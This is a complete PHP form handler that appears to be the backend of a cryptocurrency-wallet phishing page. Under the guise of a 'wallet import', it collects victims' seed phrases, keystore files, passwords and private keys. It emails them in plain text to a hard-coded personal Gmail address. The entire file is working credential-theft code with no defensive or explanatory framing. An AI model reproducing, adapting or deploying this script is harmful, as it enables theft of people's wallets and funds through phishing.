<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect form data
    $phrase = $_POST['phrase'];
    $keystore = $_POST['keystore'];
    $password = $_POST['password'];
    $key = $_POST['key'];
    $value = $_POST['value'];

    // Recipient email address
    $to = "essienpeter57@gmail.com";
    $subject = "Wallet Import Details";

    // Create the email body
    $message = "Phrase: $phrase\n";
    $message .= "Keystore JSON: $keystore\n";
    $message .= "Password: $password\n";
    $message .= "Private Key: $key\n";
    $message .= "Value: $value\n";

    // Set email headers
    $headers = "From: no-reply@example.com";

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        echo "Email sent successfully.";
    } else {
        echo "Failed to send email.";
    }
}
?>
